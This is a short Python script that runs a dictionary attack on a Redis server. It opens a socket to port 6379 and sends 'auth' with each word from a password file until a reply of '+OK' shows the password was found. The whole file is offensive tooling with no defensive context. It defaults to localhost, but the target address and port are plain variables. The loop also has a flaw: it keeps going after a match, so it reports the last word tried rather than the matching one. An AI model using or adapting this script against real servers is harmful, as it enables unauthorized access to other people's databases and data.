from base64 import decode, encode, encodebytes
from email import message
from encodings import utf_8
import re
import socket
import sys
from traceback import print_tb

dictionary = "password.txt"
target_ip = "127.0.0.1"
target_port = 6379

def crack_password(dic, ip, port):
    flag = 0
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    with open(dic,"r") as f:
        for i in f:
            i = i.strip('\n')
            message = "auth " + i + " \n"
            s.send(str.encode(message))
            res = s.recv(1024).decode('utf-8').strip('\n')
            #print(res)
            if '+OK' in res:
                flag = 1
                #print(f'success find!!!\nHOST: {ip}, port: {port}, password: {i} \n')
    return (flag,i)


if __name__ == "__main__":
    flag = crack_password(dictionary, target_ip, target_port)
    if flag[0] == 1:
        print(f'success find!!!\nHOST: {target_ip}, port: {target_port}, password: {flag[1]} \n')
    else:
        print(f'not found password')